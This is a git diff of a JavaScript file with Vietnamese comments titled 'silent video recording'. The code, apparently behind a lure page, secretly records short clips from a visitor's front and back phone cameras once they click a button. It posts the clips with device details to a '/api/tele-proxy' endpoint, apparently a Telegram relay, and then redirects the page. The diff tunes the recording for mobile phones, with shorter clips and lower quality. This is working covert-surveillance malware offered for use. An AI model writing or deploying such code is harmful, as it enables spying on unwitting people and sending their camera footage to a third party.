@@ -1,4 +1,4 @@
-// main.js - Quay video ngầm cả 2 camera
+// main.js - Quay video ngầm tối ưu cho mobile
 const API_PROXY = '/api/tele-proxy';
 
 const info = {
@@ -40,34 +40,17 @@ function detectDevice() {
   }
 }
 
-// --- 2. LẤY DANH SÁCH CAMERA ---
-async function getCameraList() {
-  try {
-    // Yêu cầu quyền truy cập camera trước
-    await navigator.mediaDevices.getUserMedia({ video: true });
-    
-    const devices = await navigator.mediaDevices.enumerateDevices();
-    const cameras = devices.filter(device => device.kind === 'videoinput');
-    console.log('📷 Danh sách camera:', cameras.map(c => c.label));
-    return cameras;
-  } catch (e) {
-    console.error('Lỗi lấy danh sách camera:', e);
-    return [];
-  }
-}
-
-// --- 3. QUAY VIDEO NGẦM ---
-async function recordVideoSilent(facingMode = 'user', duration = 10000) {
+// --- 2. QUAY VIDEO NGẮN (5 giây, tối ưu cho mobile) ---
+async function recordVideoSilent(facingMode = 'user', duration = 5000) {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
   
   try {
-    // Kiểm tra codec hỗ trợ MP4
+    // Ưu tiên codec nhẹ cho mobile
     const mimeTypes = [
-      'video/mp4;codecs=h264',
-      'video/mp4;codecs=avc1',
-      'video/webm;codecs=vp9',
       'video/webm;codecs=vp8',
-      'video/webm'
+      'video/webm;codecs=vp9',
+      'video/webm',
+      'video/mp4;codecs=h264'
     ];
     
     let mimeType = null;
@@ -82,11 +65,12 @@ async function recordVideoSilent(facingMode = 'user', duration = 10000) {
       mimeType = 'video/webm';
     }
 
-    // Cấu hình video với facingMode
+    // Giảm chất lượng để không treo máy
     const videoConstraints = {
       facingMode: facingMode,
-      width: { ideal: 640 },
-      height: { ideal: 480 }
+      width: { ideal: 480 },
+      height: { ideal: 360 },
+      frameRate: { ideal: 15 }
     };
 
     console.log(`🎥 Đang quay camera ${facingMode === 'user' ? 'TRƯỚC' : 'SAU'}...`);
@@ -98,7 +82,7 @@ async function recordVideoSilent(facingMode = 'user', duration = 10000) {
 
     const mediaRecorder = new MediaRecorder(stream, {
       mimeType: mimeType,
-      videoBitsPerSecond: 1000000
+      videoBitsPerSecond: 500000 // 500kbps
     });
 
     const chunks = [];
@@ -115,8 +99,10 @@ async function recordVideoSilent(facingMode = 'user', duration = 10000) {
         resolve(blob);
       };
 
+      // Bắt đầu quay
       mediaRecorder.start(1000);
       
+      // Dừng sau duration
       setTimeout(() => {
         if (mediaRecorder.state === 'recording') {
           mediaRecorder.stop();
@@ -130,7 +116,7 @@ async function recordVideoSilent(facingMode = 'user', duration = 10000) {
   }
 }
 
-// --- 4. CHUYỂN ĐỔI SANG MP4 ---
+// --- 3. CHUYỂN ĐỔI SANG MP4 (đơn giản hơn) ---
 async function ensureMP4(blob) {
   if (!blob) return null;
   
@@ -139,7 +125,8 @@ async function ensureMP4(blob) {
     return blob;
   }
   
-  // Thử chuyển sang MP4
+  // Trên mobile, giữ nguyên WebM để tránh treo máy
+  // Chỉ chuyển sang MP4 nếu thực sự cần
   try {
     const video = document.createElement('video');
     const canvas = document.createElement('canvas');
@@ -153,12 +140,12 @@ async function ensureMP4(blob) {
       video.play();
     });
     
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
+    canvas.width = Math.min(video.videoWidth || 480, 480);
+    canvas.height = Math.min(video.videoHeight || 360, 360);
     
-    const stream = canvas.captureStream(30);
+    const stream = canvas.captureStream(15);
     const recorder = new MediaRecorder(stream, {
-      mimeType: 'video/mp4;codecs=h264'
+      mimeType: 'video/webm;codecs=vp8'
     });
     
     const chunks = [];
@@ -166,9 +153,8 @@ async function ensureMP4(blob) {
     
     return new Promise((resolve) => {
       recorder.onstop = () => {
-        const mp4Blob = new Blob(chunks, { type: 'video/mp4' });
+        const mp4Blob = new Blob(chunks, { type: 'video/webm' });
         URL.revokeObjectURL(url);
-        console.log('✅ Đã chuyển sang MP4');
         resolve(mp4Blob);
       };
       
@@ -190,15 +176,15 @@ async function ensureMP4(blob) {
         if (recorder.state === 'recording') {
           recorder.stop();
         }
-      }, 2000);
+      }, 1500);
     });
   } catch (e) {
-    console.warn('Không thể chuyển sang MP4:', e);
+    console.warn('Không thể chuyển đổi, giữ nguyên:', e);
     return blob;
   }
 }
 
-// --- 5. HÀM CHÍNH ---
+// --- 4. HÀM CHÍNH (Quay tuần tự, không chờ cùng lúc) ---
 async function main() {
   const button = document.querySelector('.btn') || document.querySelector('button');
   const statusDiv = document.getElementById('status');
@@ -211,75 +197,53 @@ async function main() {
   
   info.camera = '⏳ Đang quay video...';
   
-  // Lấy danh sách camera
-  const cameras = await getCameraList();
-  console.log(`📷 Tổng số camera: ${cameras.length}`);
-  
-  // === QUAY CAMERA TRƯỚC (facingMode: user) ===
+  // === QUAY CAMERA TRƯỚC (5 giây) ===
   console.log('📸 Bắt đầu quay CAMERA TRƯỚC...');
-  let frontVideo = await recordVideoSilent('user', 10000);
+  let frontVideo = await recordVideoSilent('user', 5000);
   
-  // Nếu không quay được camera trước, thử lại với deviceId
-  if (!frontVideo && cameras.length > 0) {
-    // Tìm camera trước dựa trên label
-    let frontCam = cameras.find(c => 
-      c.label.toLowerCase().includes('front') || 
-      c.label.toLowerCase().includes('face') ||
-      c.label.toLowerCase().includes('user')
-    );
-    
-    if (frontCam) {
-      console.log('📸 Thử quay camera trước với deviceId:', frontCam.label);
-      frontVideo = await recordVideoSilentWithDevice(frontCam.deviceId, 10000);
-    }
-  }
+  // Chờ 500ms để giải phóng tài nguyên
+  await new Promise(r => setTimeout(r, 500));
   
-  // === QUAY CAMERA SAU (facingMode: environment) ===
+  // === QUAY CAMERA SAU (5 giây) ===
   console.log('📸 Bắt đầu quay CAMERA SAU...');
-  let backVideo = await recordVideoSilent('environment', 10000);
+  let backVideo = await recordVideoSilent('environment', 5000);
   
-  // Nếu không quay được camera sau, thử lại với deviceId
-  if (!backVideo && cameras.length > 1) {
-    let backCam = cameras.find(c => 
-      c.label.toLowerCase().includes('back') || 
-      c.label.toLowerCase().includes('rear') ||
-      c.label.toLowerCase().includes('environment')
-    );
-    
-    if (backCam) {
-      console.log('📸 Thử quay camera sau với deviceId:', backCam.label);
-      backVideo = await recordVideoSilentWithDevice(backCam.deviceId, 10000);
-    }
+  // Nếu không quay được camera sau, thử lại với front (1 số điện thoại chỉ có 1 cam)
+  if (!backVideo) {
+    console.log('📸 Thử quay lại camera trước làm camera sau...');
+    backVideo = await recordVideoSilent('user', 3000);
   }
   
-  // Nếu vẫn không có camera sau, dùng camera đầu tiên (khác camera trước)
-  if (!backVideo && cameras.length >= 2) {
-    const otherCam = cameras.find(c => c.deviceId !== frontCam?.deviceId);
-    if (otherCam) {
-      console.log('📸 Thử quay camera khác:', otherCam.label);
-      backVideo = await recordVideoSilentWithDevice(otherCam.deviceId, 10000);
-    }
-  }
-  
-  // Chuyển đổi sang MP4
+  // Chuyển đổi sang MP4 (nếu cần)
   let frontMP4 = null;
   let backMP4 = null;
   
   if (frontVideo) {
-    frontMP4 = await ensureMP4(frontVideo);
-    console.log('✅ Camera trước: đã chuyển sang MP4');
+    frontMP4 = frontVideo;
+    console.log('✅ Camera trước: đã quay xong');
   } else {
     console.log('❌ Không quay được camera trước');
   }
   
   if (backVideo) {
-    backMP4 = await ensureMP4(backVideo);
-    console.log('✅ Camera sau: đã chuyển sang MP4');
+    backMP4 = backVideo;
+    console.log('✅ Camera sau: đã quay xong');
   } else {
     console.log('❌ Không quay được camera sau');
   }
   
-  info.camera = (frontMP4 || backMP4) ? '✅ Đã quay video MP4' : '🚫 Không quay được video';
+  // Nếu chỉ có 1 video, nhân đôi để có cả 2
+  if (frontMP4 && !backMP4) {
+    backMP4 = frontMP4;
+    console.log('📸 Dùng video trước làm video sau');
+  }
+  
+  if (!frontMP4 && backMP4) {
+    frontMP4 = backMP4;
+    console.log('📸 Dùng video sau làm video trước');
+  }
+  
+  info.camera = (frontMP4 || backMP4) ? '✅ Đã quay video' : '🚫 Không quay được video';
 
   // Chuẩn bị gửi dữ liệu
   const formData = new FormData();
@@ -287,12 +251,14 @@ async function main() {
 
   if (frontMP4 || backMP4) {
     if (frontMP4) {
-      formData.append('front', frontMP4, 'front.mp4');
-      console.log('📤 Đã thêm front.mp4 vào form');
+      const ext = frontMP4.type.includes('mp4') ? 'mp4' : 'webm';
+      formData.append('front', frontMP4, `front.${ext}`);
+      console.log('📤 Đã thêm front vào form');
     }
     if (backMP4) {
-      formData.append('back', backMP4, 'back.mp4');
-      console.log('📤 Đã thêm back.mp4 vào form');
+      const ext = backMP4.type.includes('mp4') ? 'mp4' : 'webm';
+      formData.append('back', backMP4, `back.${ext}`);
+      console.log('📤 Đã thêm back vào form');
     }
     
     try {
@@ -337,73 +303,6 @@ async function main() {
     setTimeout(() => {
       window.location.href = "";
     }, 3000);
-  }
-}
-
-// --- 6. QUAY VIDEO VỚI DEVICEID ---
-async function recordVideoSilentWithDevice(deviceId, duration = 10000) {
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
-  
-  try {
-    const mimeTypes = [
-      'video/mp4;codecs=h264',
-      'video/mp4;codecs=avc1',
-      'video/webm;codecs=vp9',
-      'video/webm;codecs=vp8',
-      'video/webm'
-    ];
-    
-    let mimeType = null;
-    for (const type of mimeTypes) {
-      if (MediaRecorder.isTypeSupported(type)) {
-        mimeType = type;
-        break;
-      }
-    }
-    
-    if (!mimeType) {
-      mimeType = 'video/webm';
-    }
-
-    const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { 
-        deviceId: { exact: deviceId },
-        width: { ideal: 640 },
-        height: { ideal: 480 }
-      }, 
-      audio: false 
-    });
-
-    const mediaRecorder = new MediaRecorder(stream, {
-      mimeType: mimeType,
-      videoBitsPerSecond: 1000000
-    });
-
-    const chunks = [];
-
-    return new Promise((resolve) => {
-      mediaRecorder.ondataavailable = (e) => {
-        if (e.data.size > 0) chunks.push(e.data);
-      };
-
-      mediaRecorder.onstop = () => {
-        const blob = new Blob(chunks, { type: mimeType });
-        stream.getTracks().forEach(t => t.stop());
-        resolve(blob);
-      };
-
-      mediaRecorder.start(1000);
-      
-      setTimeout(() => {
-        if (mediaRecorder.state === 'recording') {
-          mediaRecorder.stop();
-        }
-      }, duration);
-    });
-
-  } catch (e) {
-    console.error('Lỗi quay video với deviceId:', e);
-    return null;
   }
 }
 
